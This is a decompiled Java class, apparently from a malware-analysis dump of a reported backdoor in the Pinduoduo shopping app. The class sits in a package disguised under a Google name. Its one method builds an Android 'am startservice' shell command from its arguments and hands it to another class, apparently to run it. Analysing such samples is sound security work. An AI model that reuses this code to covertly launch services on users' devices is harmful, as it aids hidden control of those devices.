package com.google.android.sd.biz_dynamic_dex.a;

public final class b {
  public static String a(String paramString1, String paramString2, String paramString3) {
    StringBuilder stringBuilder = new StringBuilder("am startservice -n ");
    stringBuilder.append(paramString1);
    stringBuilder.append("/");
    stringBuilder.append(paramString2);
    stringBuilder.append(" -d ");
    stringBuilder.append(paramString3);
    stringBuilder.append(" -f 131");
    return c.a(stringBuilder.toString());
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\7877ec6850344e7aad5fdd57f6abf238-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\a\b.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */